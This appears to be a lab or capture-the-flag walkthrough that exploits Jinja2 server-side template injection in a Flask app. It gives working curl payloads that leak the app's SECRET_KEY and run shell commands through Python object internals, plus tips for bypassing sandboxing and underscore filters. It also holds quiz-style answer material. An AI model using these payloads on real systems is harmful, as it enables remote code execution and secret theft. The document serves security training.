# Scenario 27 — Server-Side Template Injection (Jinja2) to RCE

**Difficulty:** 🔴 | **Time:** ~30 min | **Domains:** 13, 14
**Tools:** `curl`, Burp

## Story
Target 10.10.10.27 runs a Flask app echoing the `name` query parameter. Exploit SSTI to execute commands and read `/etc/flag`.

## Step 1 — Confirm reflection
```bash
curl "http://10.10.10.27/hello?name=world"
```
**Expected finding:** `Hello world`.

## Step 2 — Test template injection
```bash
curl "http://10.10.10.27/hello?name={{7*7}}"
```
**Expected finding:** `Hello 49` → Jinja2 SSTI confirmed. `{{7*'7'}}` = `7777777` also distinguishes from Twig.

## Step 3 — Fingerprint the engine
| Payload | Jinja2 | Twig | ERB |
|---|---|---|---|
| `{{7*'7'}}` | 7777777 | 49 | err |
| `{{config}}` | Flask Config | err | err |

## Step 4 — Leak config / secret key
```bash
curl "http://10.10.10.27/hello?name={{config}}"
```
**Expected finding:** Flask config dict with `SECRET_KEY`.

## Step 5 — Escalate to RCE via subclasses
```bash
curl -G "http://10.10.10.27/hello" --data-urlencode \
"name={{ ''.__class__.__mro__[1].__subclasses__() }}"
```
**Expected finding:** Huge list of classes. Find `<class 'subprocess.Popen'>` index, or use `os._wrap_close`:
```bash
curl -G "http://10.10.10.27/hello" --data-urlencode \
"name={{ ''.__class__.__mro__[1].__subclasses__()[<idx>].__init__.__globals__['popen']('id').read() }}"
```

## Step 6 — Cleaner payload (works on Flask/Jinja2)
```bash
curl -G "http://10.10.10.27/hello" --data-urlencode \
"name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/flag').read() }}"
```
**Expected finding:** flag contents.

## Step 7 — Final answer
**Answer format:** flag string from `/etc/flag`.

## Gotchas across this chain
- Some apps sandbox Jinja (`SandboxedEnvironment`) — blocks `__class__` access. Bypass via `|attr('__class__')`.
- URL-encode `{`, `}`, `'`, `+`, spaces.
- If filter strips `__`, use `\x5f\x5f` unicode or `request|attr('application')`.
- Remember: `{{ }}` is expression; `{% %}` is statement — SSTI usually works in `{{ }}`.

## Variant questions this scenario teaches
- "What is the Flask SECRET_KEY?"
- "What template engine is vulnerable?"
- "What output does {{7*'7'}} produce?" → engine fingerprint

